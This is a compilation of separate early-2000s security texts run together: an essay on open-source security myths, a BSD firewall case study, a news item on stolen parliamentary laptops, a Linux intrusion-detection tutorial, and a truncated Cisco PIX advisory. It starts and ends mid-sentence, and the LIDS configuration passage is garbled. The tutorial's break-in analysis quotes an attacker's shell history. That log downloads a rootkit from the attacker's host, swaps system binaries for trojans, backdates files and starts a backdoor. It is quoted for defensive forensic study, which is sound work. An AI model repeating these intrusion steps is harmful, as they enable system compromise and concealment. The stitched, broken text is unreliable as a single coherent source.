      (If you're running a Mailman version earlier than 2.0 beta, allow me to 
      suggest that you upgrade immediately. The latest version can be found on 
      the Mailman Web site at http://www.list.org).

      

      
      The Myth of Open Source Security by John Viega Security: tougher than it 
      looks Even if you get the right kind of people doing the right kinds of 
      things, you may have problems that you never hear about. Security problems 
      are often incredibly subtle, and may span large parts of a source tree. It 
      is not uncommon to have two or three features spread throughout a program, 
      none of which constitutes a security problem alone, but which can be used 
      together to perform a security breach. For example, two buffer overflows 
      recently found in Kerberos version 5 could only be exploited when used in 
      conjunction with each other.

      As a result, doing security reviews of source code tends to be complex and 
      boring, since you generally have to look at a lot of code, and understand 
      it pretty well. Even many experts don't like to do these kinds of reviews.

      And even the experts can miss things. Consider the case of the popular 
      open source FTP server wu-ftpd. In the past two years, several very subtle 
      buffer overflow problems have been found in the code. Almost all of these 
      problems had been in the code for years, despite the fact that the program 
      had been examined many times by both hackers and security auditors. If any 
      of them had discovered the problems, they didn't announce it publicly. In 
      fact, the wu-ftpd has been used as a case study for vulnerability 
      detection techniques that never identified these problems as definite 
      flaws. One tool was able to identify one of the problems as potentially 
      exploitable, but researchers examined the code thoroughly for a couple of 
      days, and came to the conclusion that there was no way that the problem 
      identified by their tool could actually be exploited. Over a year later, 
      they learned that they were wrong, when an expert audit finally did turn 
      up the problem.

      In code with any reasonable complexity, it can be very difficult to find 
      bugs. The wu-ftpd is less than 8000 lines of code long, but it was easy 
      for several bugs to remain hidden in that small space over long periods of 
      time.

      To compound the problem, even when people know about security holes, they 
      may not get fixed, at least not right away. Even when identified, the 
      security problems in Mailman took many months to fix, because security was 
      not the the core development team's most immediate concern. In fact, the 
      team believes one problem still persists in the code, but only in a 
      configuration that we suspect doesn't get used.

      An army in my belly       The single most pernicious problem in computer 
      security today is the buffer overflow. While the availability of source 
      code has clearly reduced the number of buffer overflow problems in open 
      source programs, according to several sources, including CERT, buffer 
      overflows still account for at least a quarter of all security advisories, 
      year after year.

      Open source proponents sometimes claim that the "many eyeballs" phenomenon 
      prevents Trojan horses from being introduced in open source software. The 
      speed with which the TCP wrappers Trojan was discovered in early 1999 is 
      sometimes cited as supporting evidence. This too can lull the open source 
      movement into a false sense of security, however, since the TCP wrappers 
      Trojan is not a good example of a truly stealthy Trojan horse: the code 
      was glaringly out of place and obviously put there for malicious purposes 
      only. It was as if the original Trojan horse had been wheeled into Troy 
      with a sign attached that said, "I've got an army in my belly!"

      Well-crafted Trojans are quite different. They generally look like 
      ordinary bugs with security implications, and are very subtle. Take, for 
      example, wu-ftpd. Who is to say that one of the buffer overflows that have 
      been found recently was not a Trojan horse introduced years ago when the 
      distribution site was hacked?

      The open source movement hasn't made the problem of buffer overflows go 
      away. But eventually, newer programming languages may; unlike C, modern 
      programming languages like Java or Python never have buffer overflow 
      problems, because they do automatic bounds checking on array accesses. As 
      with any technology, fixing the root of the problem is far more effective 
      than any ad hoc solution.

      Is closed source any more secure?       Critics of open source software 
      might say that providing source code makes the job of the malicious 
      attacker easier. If only a binary is available, the bar has been raised 
      high enough to send most such people looking for lower-hanging fruit. But 
      as the many well-publicized security holes in commercial software make 
      clear, attackers can find problems without the source code; it just takes 
      longer. From a security point of view, the advantages of having the source 
      code available for everyone to see far outweighs any benefit hackers may 
      gain.There are many benefits of open source software unrelated to 
      security. And the "many eyeballs" effect does have the potential to make 
      open source software more secure than proprietary systems. Currently, 
      however, the benefits open source provides in terms of security are vastly 
      overrated, because there isn't as much high-quality auditing as people 
      believe, and because many security problems are much more difficult to 
      find than people realize. Open source programs which appeal to a limited 
      audience are particularly at risk, because of the smaller number of 
      eyeballs looking at the code. But all open source software is vulnerable, 
      and the open source movement can only benefit by paying more attention to 
      security.

      Running a BSD-based Firewall FreeBSD vs. OpenBSD as a firewall platform. 

      By Jim O'Gorman

      Introduction

      Internet security is currently a hot topic. Because of that, many smaller 
      networks are turning toward firewalls to give them some protection. Many 
      of these networks do not have the money to pay for a commercial firewall 
      product, so they are moving to free Unix-based firewalls such as IP 
      Firewall, IP Filter or IPChains.

      The company I work for was in a similar situation. I hope to give you some 
      insight of why we chose the product we did, where we started, what we 
      learned from the initial installation and also what we've changed to 
      improve management of the network. I am not going to explain firewall rule 
      sets at all. That is too large of a topic. For that I would suggest 
      getting the book "Firewalls and Internet Security" by Cheswick and 
      Bellovin (ISBN 0201633574) and consulting the documentation of the 
      firewall product you decide to go with.

      Also, in this paper I will state what worked best for us at the time. What 
      might work best for us in a year may be different. Just like what will 
      work best for you now may be different from what we chose. Take the 
      information in this paper, add it to information drawn elsewhere and form 
      your own conclusion for what will be best for you. Also, keep in mind that 
      because I may have decided that your favorite OS may not have been best 
      for me, it is not an insult to you. Don't view OS's as a religion, because 
      they are only tools. Nothing more. Use the best one for a given job and 
      let it stay at that.

      Commercial Firewalls vs. Open Source Firewalls

      The first bridge that we had to cross was getting people to accept an open 
      source firewall package. Everyone knows and trusts products like 
      Checkpoint and Cisco's Pix firewall. A firewall is a key part of the 
      security infrastructure. It is a stretch to ask management to trust a 
      product, they may have never heard of, for such an important part of the 
      network.

      When you buy a commercial firewall product, you are not buying a better 
      quality product, but only paying for a name. That name gives your 
      management and you confidence that there is a strong, solid company behind 
      your firewall. With an open source firewall, you do not get that name. 
      However, you do get the equivalent credibility through the very nature of 
      open source. Anyone that uses it will be more than happy to tell you the 
      good and the bad that they have gone through with the product.

      The other bonus is that open source firewalls are usually written by 
      people that are using the product themselves. This gives them every 
      incentive in the world of making it work right. Plus, with the open source 
      model you can influence the direction of the program. Darren Reed of IP 
      Filter has impressed me many times over with his openness to add features 
      that users have asked for. You do not find that with a bigger commercial 
      company.

      Our Firewall product

      I am a BSD guy. That is the platform I know best. With that in mind, there 
      are two popular free firewalls we could pick from: IP Filter and IP 
      Firewall. IP Firewall is a fine product that I have used in the past with 
      success, but at the time it could not keep state. A stateful firewall was 
      a requirement for this particular project, so we decided to go with IP 
      Filter (http://coombs.anu.edu.au/~avalon/).

      There is a bit of a religious war about stateful vs. non-stateful (packet 
      filter) firewalls. Don't take my word for which is better. Look through 
      the book referenced above to see which would work best for you. I prefer 
      to stay with a stateful firewall, because it allows me to only allow the 
      initial Syn packet through. Then the firewall will allow the rest of that 
      TCP session through. This prevents things like stealth scans from getting 
      through your network.

      IP Filter is a nice, small, and efficient firewall that comes with the 
      base OS of FreeBSD, OpenBSD, and NetBSD. It also runs on Solaris, SunOS, 
      BSD/OS, Irix, and HP/UX. The cross platform nature of the product was a 
      big feather in its cap. It would allow us to go with one Unix today, 
      switch to a different Unix in the future, and still keep the same firewall 
      product. The next question was: What platform are we going to run this 
      product on?

      Base OS

      As previously stated, I am a BSD guy. So we came right out looking at 
      FreeBSD and OpenBSD. Since this was a smaller installation, I was looking 
      forward to using an OS which I was not as familiar with. I am more 
      familiar with FreeBSD, which was a strike against it and gave OpenBSD a 
      leg up.

      The other big issue supporting OpenBSD is the way it is marketed. If you 
      go to http://www.openbsd.org they will be more than happy to tell you that 
      they have "Three years without a remote hole in the default install!" and 
      "Two years without a localhost hole in the default install!". That is very 
      impressive. You do not go that long without a root exploit by luck. This 
      shows a focus by the OpenBSD developers to make the default install of 
      OpenBSD secure. Plus, IP Filter is the default firewall with OpenBSD so it 
      makes getting up and running with OpenBSD very quick.

      With the hard core security that drives the OpenBSD project along with the 
      chance to work with something new in mind, we decided that OpenBSD would 
      be a good choice for a BSD-based IP Filter firewall.

      Implementation

      This is where the fun really is, in setting up the firewall itself. After 
      the install of OpenBSD, all you have to do is enable IP Filter and plug in 
      your rule set. The best source of information for setting up IP Filter is 
      in the OpenBSD FAQ at http://www.openbsd.org/faq/faq6.html. Follow those 
      instructions and you should be up and going in no time. The only real 
      thing you should watch is when you write your rule sets. You really have 
      to understand IP. Otherwise you are very likely to open up a hole in the 
      network.

      Testing

      After the firewall is installed and the rules are written, the most 
      important thing is testing. You cannot setup a firewall, throw it on the 
      network and assume it works.

      Testing the NAT (Network Address Translation) is very easy. Simply plug a 
      machine on the internal interface and see if it works. SSH into a box on a 
      remote network, do a "who" and see what IP it says you are coming from. 
      Really, NAT is kind of nice in the regard that it either works or does 
      not.

      The firewall, however, is a different story. There is really no right way 
      of testing it. What we did was go through the rule set and double check 
      all the rules. After that, from a remote network we ran Nessus 
      (http://www.nessus.org/), Nmap (http://www.insecure.org/nmap/index.html) 
      and Saint (http://www.wwdsi.com/saint/) against our public IP range. You 
      may have some different preferred tools to use for this purpose. The key 
      is to be creative. Try what you would do if you were trying to break into 
      that network. Use the tools that crackers trying to break in would use.

      After you have things looking good, you must remember to test every couple 
      of months. No firewall is ever done. As new attacks come out, you must 
      make sure you are defended against them.

      Results and Changes

      What we found was that the initial install went fine. The firewall was 
      secure, the NAT worked great, and everyone was happy. Then the time came 
      when we wanted to upgrade IP Filter to the newest version. That is when we 
      ran into a bit of trouble. Upgrading was important to us because we wanted 
      to have access to IP Filter's newest features and bug fixes.

      After some searching around, we ran into e-mails such as this one: 
      http://www.false.net/ipfilter/2000_02/0004.html. The short of them is that 
      it is not suggested practice to install IP Filter from source on OpenBSD, 
      and it is doubtful it would even work. Instead, what users are suppose to 
      do is upgrade OpenBSD to -current, where the maintainer of the IP Filter 
      section should have the newest version integrated into the source tree.

      This was an issue for us. Running -current on any type of production 
      server, much less something as key as a firewall, is not something that 
      should be done. For those not familiar with the way BSDs work, -current is 
      the up-to-when-you-cvsup current snapshot of the source tree of the OS. 
      There is no guarantee that it will work, be bug free or even compile. 
      -current is a work in progress for developers to use, and not intended for 
      production use.

      So, in order to upgrade IP Filter on OpenBSD on our production firewalls 
      we were left with two choices: either run not-yet-ready-for-production 
      code or to not upgrade at all. Because of the chances of a problem with IP 
      Filter coming out in the future, we decided to change to FreeBSD. FreeBSD 
      would allow us to track -stable (a branch of the source tree meant for 
      production use), and allow us to upgrade IP Filter from source when ever 
      we felt like it.

      The Change

      Once you break down what you actually do on a firewall that is maintained 
      by someone that understands firewalls, many of OpenBSD strengths don't 
      matter. Let's give a couple of "for instances" to make sure that my point 
      is being made clear.

      A home user, who may not understand Unix well, may best be served by 
      running OpenBSD as a firewall platform. The reason for this is that the 
      home user can do a default OpenBSD install and feel good in the fact that 
      even if he does not know enough to turn off services, he will be at least 
      a little protected by the fact there has been no root exploits for quite 
      some time. True, a box is only as secure as the administrator makes it, 
      but this type of user is not likely to change much of anything. In which 
      case, the secure-by-default install will help them. Plus, a user like this 
      is not likely to want to upgrade their install until the next version 
      upgrade comes out, so the inflexibility of IP Filter on OpenBSD should not 
      hurt them.

      For a use like ours, however, where the administrator will go over the box 
      and shutdown the services they will never need, and no user logs in on the 
      firewall, there is not much that OpenBSD will give you. OpenBSD and 
      FreeBSD both running IP Filter, with SSH as the only other service, will 
      be equally secure. If there are no other remote services running, there is 
      no other way into the box.

      With no loss in security while gaining the flexibility of being able to 
      upgrade IP Filter whenever needed, there was no reason not to use FreeBSD. 
      With those facts in mind, we made the switch of OpenBSD to FreeBSD.

      Justification

      The upgrade was very simple. Install FreeBSD, install the newest IP 
      Filter, copy over the rule sets, and we were done. With the rule set 
      already written, there is really not much else to do.

      Shortly after we finished the upgrade, we felt justified for our decision. 
      In this e-mail, http://false.net/ipfilter/2000_05/0091.html, an IP Filter 
      user had found a bug that may have been used to exploit an IP Filter 
      install. If this exploit had been developed then there would have been a 
      hole in our firewall. If we had still been on OpenBSD, we would have had 
      to choose between running -current or sticking with the old, buggy, 
      version of IP Filter.

      The Future

      The lesson learned here is that you cannot listen to marketing, even open 
      source marketing. Even though OpenBSD is known as "the secure OS," and a 
      firewall is an application where you would want the utmost security, the 
      product marketed towards that niche may not be the best choice for the 
      application. The best thing to do is ignore the marketing, look at all the 
      facts, and decide what is best for your install.

      Hopefully in the future, there will be an easier way to upgrade IP Filter 
      under OpenBSD. Even if they make one, I do not see any reason for us to 
      switch back. Switching back would gain us nothing. We will see what the 
      future brings and the direction of both BSD projects and IP Filter change 
      that might affect the way we do things. An important thing about computers 
      in general is nothing is static, as new products come out and existing 
      products change, you have to go with what is best at the time.

      Laptops stolen from Parliament AAP

      

      FIVE laptop computers worth about $30,000 have been stolen from Parliament 
      House in what appears to have been an inside job.

      The laptops could allow hackers access to the parliamentary network, a 
      Senate committee heard today.       They were taken over a short period of 
      time from secured areas at parliament.

      Parliamentary official Robert Alison said the laptops appeared to have 
      been taken by parliamentary workers or visitors with security clearance.

      "It seems strange to me that four or five computers would disappear in a 
      short time, which says to me that there may be a market for them," Mr 
      Alison said.

      "One of the concerns is that all five of those computers were taken from 
      what we call the private areas of Parliament House, so presumably the 
      person or persons who took them was a passholder of some sort."

      Mr Alison, the Usher of the Black Rod, said the laptops were protected by 
      passwords but acknowledged their contents were not 100 per cent safe.

      Introduction
           This article focuses on several host-based intrusion 
      detection systems that are available on Linux. In particular, I will 
      cover some of the basics of installing setting up these packages, how 
      they are useful, and in what circumstances they can be used.

      Systems Security 101
           This article assumes a basic knowledge of 
      systems security. In particular, I will assume that the most basic 
      security measures have already been taken to secure a host against 
      intrusion from the internet. These measures could include:

      Firewalling, to ensure that access to the various TCP and UDP ports of 
      the system that were not intended for internet access are prevented. For 
      example, a basic set of firewalling rules for a web server would ensure 
      that the only TCP/IP access to the machine was on TCP port 80, the port 
      normally used for HTTP access.

      Disabling daemons that are not required. For example: A web server 
      normally needs a process running to serve web pages. Processes that are 
      not associated with serving web pages, such as RPC/Portmap services, NFS 
      services, X Font Server, DNS name server, and other extraneous and unused 
      applications should be stopped or disabled. On a Red Hat Linux system, 
      this is normally done by using one of the run level editors, for example 
      ntsysv or tksysv, to disable the startup of any daemon or service that is 
      not required.

      Disabling access to ports that are not required, by editing 
      /etc/inetd.conf. Typically, a system will come pre-installed with access 
      to many ports enabled in the /etc/inetd.conf file. Editing this file to 
      remove or comment out any lines that are not required is the most basic 
      system security activity and should be carried out on all systems.

      Lines of Defence

      Illustration 1: Multi Layered Systems Security

      In this article, I will discuss a multi-layered approach to systems 
      security. Several security layers can be used independently to provide 
      additional protection in case any of the layers should be breached. An 
      example of a multi-layered security system is shown in illustration 1. 

      Each layer in the diagram provides additional data protection to the 
      layers above it. For example, the first layer is the firewall. Should an 
      intrusion attempt not be defeated by the firewall, a second layer, the 
      Port Sentry program, can provide additional protection.

      Further inside the security system are the LIDS and LogCheck programs, 
      that provide additional protection should an intrusion attempt not be 
      intercepted by the Port Sentry program.

      Monitoring Incoming Connections
           The first layer of protection behind 
      the firewall is a software package that will monitor incoming attempts to 
      connect to the machine. The PortSentry package 
      (http://www.psionic.com/abacus/portsentry/) provides a simple and 
      effective method of doing this.

      What does PortSentry do?
           PortSentry is a program that monitors 
      activity on specific TCP/IP ports. Activity on the ports that are 
      monitored by PortSentry is reported, and one of several options can be 
      taken, including denying further attempts to access to your system from 
      the source of the activity. This is an important defence mechanism, 
      because a hacker will typically probe your system for weaknesses ("port 
      scanning") before attempting an intrusion. Detecting the probe or port 
      scan, and completely denying further access to your system by a potential 
      hacker, robs that hacker of the ability to follow up on any port scans 
      with a real intrusion attempt.

      Installing PortSentry
           For users of Red Hat Linux, PortSentry is 
      available in RPM format on the Red Hat contrib FTP site. This site is 
      mirrored in various locations around the world, check at www.redhat.com 
      for the location of your nearest mirror. I haven't yet determined the 
      availability of a .deb format package for PortSentry but I am sure there 
      is one out there.

      For other Linux systems, installing PortSentry from the source code is 
      relatively simple.

      Recommended Configuration
           PortSentry runs in a number of modes, 
      including various TCP and UDP stealth modes. The mechanism that I prefer 
      to use for running PortSentry is to bind it to a TCP port that (a) is not 
      in use, and (b) is known in some systems to have potential for intrusion 
      attempts. For example, port 143 (imap2), port 111 (portmap) and port 23 
      (telnet) are TCP ports that I do not use on my internet systems, and my 
      web server was scanned on both of those ports in the last 24 hours.

      To start PortSentry in basic TCP mode, ensure that your system start-up 
      scripts run this command somewhere:

      portsentry -tcp

      Also, ensure that the PortSentry config file (portsentry.conf) contains a 
      TCP_PORTS line enabling scanning on the ports that you require.

      Response Options
           The "Response Options" section of the 
      portsentry.conf file allows you to specify what response that PortSentry 
      will take on detecting unwanted activity. The mechanism that I normally 
      choose is to use ipchains to block further access from the source of the 
      activity. This is done by uncommenting the following line in the 
      portsentry.conf file:

      KILL_ROUTE="/sbin/ipchains -I input -s $TARGET$ -j DENY -l"

      On systems that receive a high level of port scanning activity, removing 
      the "-l" at the end of the above line will prevent logging of further 
      incoming connections, which might be useful to save space in the log 
      files.

      Monitoring System Logs
           Firewalling systems, and software like 
      PortSentry perform one useful function, in that they monitor and prevent 
      connections coming in to unwanted ports on the system. This can prevent 
      access to a system via a standard scan-and-intrude method.

      Where a system is required to run a particular service (eg: Apache on a 
      web server, or BIND on a DNS server), and a hacker has uncovered a 
      particular loophole in the service, these programs will unfortunately not 
      achieve the result of keeping all intruders out of the system. A system 
      acting as a DNS server that has a vulnerable copy of BIND running on it 
      will eventually be discovered by a hacker that scans a wide range of 
      machines for a single port (the DNS port) on each machine, and attempts 
      intrusion against that port only. The firewall and PortSentry will 
      unfortunately see this intrusion attempt as a legitimate access to the 
      system.

      LogCheck
           LogCheck (http://www.psionic.com/abacus/logcheck/) is a 
      useful program for scanning system logs for unusual activity. LogCheck 
      works by scanning the various system log files (under Linux these are 
      located in /var/log), and notifying the system administrator by e-mail if 
      there is any unusual activity. Unusual messages in the log files can 
      often be generated by intrusion attempts, or actual intrusions against 
      your system.

      Installing LogCheck
           LogCheck is available in RPM format from the Red 
      Hat contrib archives, and from the same sources as PortSentry. Installing 
      LogCheck from the RPM file or from the source code (read the INSTALL file 
      provided with the source code) is relatively simple.

      Configuring LogCheck
           LogCheck has four main configuration files. In 
      the RPM version, these are stored in the /etc/logcheck directory. 
      Normally, only the logcheck.ignore and the logcheck.violations.ignore 
      files need modification. The normal process that I go through after 
      installing LogCheck is as follows:

      Allow LogCheck to run once with the standard configuration files. This 
      willl produce a large output file, which can be thrown away.

      24 hours later, allow LogCheck to run again. This will detect any new 
      entries in the log files since the last run, and will produce a smaller 
      but still sizeable output file. Read this file carefully.

      For entries in the file that are of no great concern (use your judgement 
      for this) find a specific identifying string in the entry. For entries 
      that are in the "Security Violations" section, add the identifying string 
      to the logcheck.violations.ignore file. For other entries (in the 
      "Unusual System Events" section), add the string to the logcheck.ignore 
      file.

      Repeat this process, once every 12 - 24 hours for approximately a week. 
      By this stage, enough "bogus" entries will be filtered out by the strings 
      that you have added to the .ignore files that the daily LogCheck report 
      will contain only genuine system concerns.

      Note that the RPM file specifies that LogCheck is to be run hourly, but 
      normally I only run it daily except on critical systems that need regular 
      monitoring. This is done by moving the /etc/cron.hourly/logcheck file 
      into /etc/cron.daily.

      Kernel Based Intrusion Detection
           Kernel based intrusion detection is 
      a relatively new art form for Linux. The main kernel based intrusion 
      detection system currently available is called LIDS, and is available 
      from http://www.lids.org/.

      What is LIDS?
           LIDS is an intrusion detection and prevention system 
      that resides within the Linux kernel.

      LIDS' protection is aimed at preventing the root user (who would normally 
      have access to the entire system) from tampering with important parts of 
      the system. LIDS' most important features include increased file system 
      protection, protection against direct port access or direct memory 
      access, protection against raw disk access, and protection of log files. 
      LIDS also prevents certain system actions, such as installing a packet 
      sniffer or changing firewall rules.

      LIDS Documentation
           The LIDS system is somewhat more complex to 
      install than either PortSentry or LogCheck. Fortunately, the LIDS web 
      site contains quite good documentation on the LIDS project, including 
      installation and configuration instructions.

      Installing LIDS
           First, before installing LIDS, make sure that you 
      have the most up to date LIDS patch (I am using 0.9), and the correct 
      kernel version. I am using the updated kernel (2.2.14-12) from the Red 
      Hat Updates FTP site, because this contains some security fixes. You also 
      need the source code for the kernel that you are using.

      LIDS is currently targeted towards the 2.2.14 kernels. I installed LIDS 
      on a Red Hat 6.2 system, this includes the 2.2.14 kernel. Before I 
      installed LIDS, I obtained the updated kernel (from 
      ftp.redhat.com/updates/ or one of its mirrors) and installed it according 
      to the instructions at 
      http://www.redhat.com/support/docs/howto/kernel-upgrade/kernel-upgrade.ht
      ml.

      The next thing I obtained was the updated kernel source, which also came 
      from ftp.redhat.com/updates/ This I installed using:

      rpm -Uhv kernel-source-2.2.14-12.i386.rpm

      Next, compile and install the lidsadm program:

      cd /usr/local/src/security/lids-0.9/lidsadm-0.9
           make make install

      Generate a RipeMD-160 password that will later be installed into the 
      kernel:

      lidsadm -P

      I entered the password "anypass" and got back the key 
      "d502d92bfead11d1ef17887c9db07a78108859e8".

      Next, I copied the standard Red Hat configuration file for my 
      architecture into the /usr/src/linux directory:

      cd /usr/src/linux/configs/
           cp kernel-2.2.12-i686.config ..

      Next, I installed the LIDS patch using the following commands:

      cd /usr/src
           patch -p0 
      </usr/local/src/security/lids-0.9/lids-0.9-2.2.14-redhat.patch

      Note that the Red Hat supplied kernel is slightly different from the 
      standard 2.2.14 kernel distributed by Linus, as it contains some updated 
      drivers. The lids-0.9-2.2.14-redhat.patch file that is available is 
      slightly different to the standard lids-0.9-2.2.14.patch file distributed 
      with LIDS, as the latter will not apply cleanly to Red Hat's kernel.

      Finally, I configured, compiled, and installed the kernel:

      cd /usr/src/linux
           make menuconfig make dep; make clean make install; 
      make modules; make modules_install

      The following script shows the LIDS configuration options that I chose 
      during the kernel configuration:

      [*] Linux Intrusion Detection System support (EXPERIMENTAL)
           --- LIDS 
      features [ ] Hang up console when raising a securit alert [*] Security 
      alert when execing unprotected programs before sealing [ ] Do not execute

      to submit password (3) Time to wait after a fail (seconds) [*] Allow remote 
      users to switch LIDS protections [ ] Allow any program to switch LIDS

      environment may vary.

      Configuring LIDS
           One important note: After compiling the kernel you 
      must configure LIDS before you next reboot!

      LIDS stores its configuration in the /etc/lids.conf file. This file 
      should never be edited by hand, instead, you should configure LIDS by 
      using the lidsadm program.

      Running "lidsadm -h" gives a page or so of help as to how to use the 
      lidsadm program. The LIDS documentation (on the LIDS web site) gives some 
      examples of using LIDS to protect files, for example:

      lidsadm -A -r /sbin

      ... which protects (marks read-only) the entire /sbin directory.

      My preferred LIDS configuration script looks like this:

      lidsadm -Z
           lidsadm -A -r /usr/bin lidsadm -A -r /bin lidsadm -A -r 
      /usr/sbin lidsadm -A -r /sbin lidsadm -A -r /usr/X11R6/bin lidsadm -A -r 
      /etc/rc.d lidsadm -A -r /etc/sysconfig

      
      Once the LIDS system has been configured, you need to update your boot 
      scripts to ensure that the "lidsadm -I" command is run during the boot 
      process. This effectively "starts" the LIDS functions in the kernel. I 
      normally place lidsadm at the end of the /etc/rc.d/rc.local script, as 
      this ensures that the LIDS functionality doesn't prevent the rest of the 
      system scripts from operating correctly.

      This is the command line that I use at the end of /etc/rc.d/rc.local to 
      start LIDS:

      /sbin/lidsadm -I -- -CAP_SYS_MODULE -CAP_SYS_RAWIO -CAP_SYS_ADMIN \
                                                   
      -CAP_SYS_PTRACE -CAP_NET_ADMIN -CAP_LINUX_IMMUTABLE \ +INIT_CHILDREN_LOCK

      Configuring LILO
           Note that since the Kernel was updated using Red 
      Hat's RPMs, you will need to follow the instructions in the Red Hat 
      kernel upgrading web page mentioned above to modify the /etc/lilo.conf 
      file. This will ensure that the new kernel that has been compiled with 
      LIDS functionality will be the one booted when your system reboots.

      After Reboot
           After the next reboot, LIDS will be running on your 
      system. If you need to stop LIDS to perform system administration tasks, 
      then you should use one of the following commands:

      /sbin/lidsadm -S -- -LIDS

      or

      /sbin/lidsadm -S -- -LIDS_GLOBAL

      You will need to provide the LIDS password, which was inserted into the 
      kernel in RipeMD-160 format during the kernel compile.

      You will also note that on shutdown, most of the shutdown scripts will 
      fail. This is normal. The final shutdown script (/etc/rc.d/init.d/halt) 
      will kill all of the processes and unmount the file systems. No other 
      process will be allowed to kill any of the children of the init() 
      process, due to the "+INIT_CHILDREN_LOCK" protection made in the rc.local 
      file (above).

      Also, every 10 minutes, you will get an error message about "rmmod \as" 
      being unable to remove a module. This is because the "-CAP_SYS_MODULE" 
      protection stops insertion or removal of modules once LIDS has started. 
      To stop the error message happening, delete the /etc/cron.d/kmod file.

      What Can LIDS Protect?
           A quick read through the LIDS documentation 
      will reveal the full set of features in LIDS. The most important 
      features, in my opinion, include the following:

      CAP_LINUX_IMMUTABLE, which protects the files and file systems from being 
      written to when marked "immutable".

      CAP_NET_ADMIN, which prevents tampering with the network configuration 
      (eg: prevents route table entries from being changed, and prevents 
      firewall entries from being tampered with).

      CAP_SYS_MODULE which prevents insertion and removal of kernel modules.

      CAP_SYS_RAWIO which prevents raw disk/device I/O.

      CAP_SYS_ADMIN which prevents a large range of other system administration 
      functions.

      INIT_CHILDREN_LOCK which prevents child processes of the init() master 
      process from being tampered with.

      All of the above features can be turned on at any point using "lidsadm 
      -I". The features can also be disabled at any point (to allow the real 
      system administrator access to the system configuration) by using 
      "lidsadm -S", and providing the LIDS password which was installed into 
      the kernel (and encrypted with RipeMD-160).

      Anatomy of a Break In
           I was recently asked to examine a system that 
      had been hacked, to determine the cause of the break-in, and to determine 
      what damage the hacker had done to the system. Fortunately, the system 
      was hacked by someone who was not particularly clever, and didn't manage 
      to conceal their tracks entirely.

      The break-in occurred when the hacker overflowed the buffer of a system 
      daemon running as root (in fact one that should not have been running on 
      the system at all, but the person who installed Linux was careless and 
      left it running, and also failed to install Red Hat's released updates 
      which would have fixed the buffer overflow problem). The hacker, however, 
      was also careless in that when they managed to open a shell (BASH) on the 
      hacked system following the break-in, they forgot that the BASH shell 
      logs all activity to a .bash_history file for use by the command line 
      recall functions. A simple read through /.bash_history revealed exactly 
      what the hacker had done while logged on to the system.

      The file read as follows (edited slightly for brevity):

      mkdir /usr/lib/... ; cd /usr/lib/...
           ftp 200.192.58.201 21 cd 
      /usr/lib/... mv netstat.gz? netstat.gz; mv ps.gz? ps.gz; mv pstree.gz? 
      pstree.gz; mv pt07.gz? pt07.gz; mv slice2.gz? slice2.gz; mv syslogd.gz? 
      syslogd.gz; mv tcpd.gz? tcpd.gz gzip -d * chmod +x * mv netstat /bin ; mv ps 
      /bin ; mv tcpd /usr/sbin/; mv syslogd /usr/sbin; mv pt07 /usr/lib/; mv 
      pstree /usr/bin ; /usr/lib/pt07 touch -t 199910122110 /usr/lib/pt07 touch -t 
      199910122110 /usr/sbin/syslogd touch -t 199910122110 /usr/sbin/tcpd touch 
      -t 199910122110 /bin/ps touch -t 199910122110 /bin/netstat touch -t 
      199910122110 /usr/bin/pstree cat /etc/inetd.conf | grep -v 15678 >> /tmp/b 
      mv /tmp/b /etc/inetd.conf killall -HUP inetd

      

      

      Reading through this file, we can note the following activity:

      A directory with an unusual name (/usr/lib/...) was created on the 
      system. An FTP connection was made back to the hacker's personal machine 
      (200.192.58.201, traced to a dial-in address somewhere in Brazil), and a 
      simple hacker-kit was downloaded.

      The hacker kit was uncompressed. It contained trojan binaries which were 
      then installed on the system.

      The trojan binaries were used to over-write the system versions of 
      netstat, ps, tcpd, syslogd, and pstree. These are programs that get used 
      to report on system activity, show running processes, show open ports, 
      etc.

      A backdoor process of some kind (/usr/lib/pt07) was installed and 
      started. Note that since the hacker has installed his or her own versions 
      of ps, pstree, and netstat, this trojan is probably invisible to the 
      system.

      What Can We Learn From This?
           Firstly, note that LIDS would not have 
      prevented the actual break-in. The hacker obtained root access to the 
      machine by connecting to and overflowing a buffer in a process that was 
      running as root.

      Once the hacker had broken in, we can note how LIDS would have minimised 
      the damage:

      LIDS, by using the CAP_LINUX_IMMUTABLE option, would have prevented the 
      trojan binaries from being written to /bin, /usr/bin, /usr/sbin, and 
      /usr/lib. These are directories that we would normally mark as immutable 
      (chattr +i) and hence could not have been changed. Note that even without 
      LIDS we can mark these directories as immutable using chattr +i, but LIDS 
      prevents even the root user from tampering with the immutable flag.

      Similarly, the touch -t commands would have failed if the files were 
      marked chattr +i.

      Even the very first line of the script, "mkdir /usr/lib/..." would have 
      failed if the /usr/lib directory was marked immutable!

      Note that LIDS would not have prevented the break-in, but would have 
      prevented the hacker from causing any significant system damage after the 
      break-in. A backdoor process could have been installed (eg: the pt07 
      backdoor could have been placed in /tmp, or any other non-immutable 
      directory), but the non-trojan versions of ps, netstat, and pstree would 
      have detected this process fairly easily and we could have come back and 
      killed it off.

      Without LIDS being installed we have no other real clues as to what the 
      hacker might have done via this backdoor, and so our only available 
      method to clean up the hacker's damage is to re-install the system 
      completely.

      OpenWall and LIDS: An Extra Layer
           Another similar system to LIDS is 
      the OpenWall project (http://www.openwall.com/linux/). The OpenWall 
      project contains some different security features to LIDS, and one of the 
      OpenWall patches in particular makes the stack area non-executable. An 
      excerpt from the OpenWall README file states:

      Most buffer overflow exploits are based on overwriting a function's 
      return address on the stack to point to some arbitrary code, which is 
      also put onto the stack. If the stack area is non-executable, buffer 
      overflow vulnerabilities become harder to exploit.

      Another way to exploit a buffer overflow is to point the return address 
      to a function in libc, usually system(). This patch also changes the 
      default address that shared libraries are mmap()'ed at to make it always 
      contain a zero byte. This makes it impossible to specify any more data 
      (parameters to the function, or more copies of the return address when 
      filling with a pattern), -- in many exploits that have to do with ASCIIZ 
      strings.

      Recently, the LIDS web site has contained some integrated LIDS + OpenWall 
      kernel patches that apply the security features of both LIDS and OpenWall 
      to the kernel in a single integrated patch set.

      Conclusions
           Using a set of layered security tools on the Linux 
      system, it is possible to prevent a wide range of system attacks, and to 
      protect your system against intrusion or tampering. A hacker's point of 
      entry into your system will be the network interfaces, and protecting these,
      and under the network interfaces, the system kernel, can discourage many 
      attacks and prevent others.

      Be aware of any potential security holes in your system. Any daemon or service
      running on your system, either as root or as a non-root user, can be a potential
      security threat. Be prepared to face attacks against these threats.

      The Cisco Secure PIX Firewall interprets FTP (File Transfer Protocol)

      Cisco Secure PIX Firewall FTP Vulnerabilities Revision 1.6 For public 
      release 2000 March 16 05:00 PM US/Pacific (UTC+0800)


      Summary       The Cisco Secure PIX Firewall interprets FTP (File Transfer 
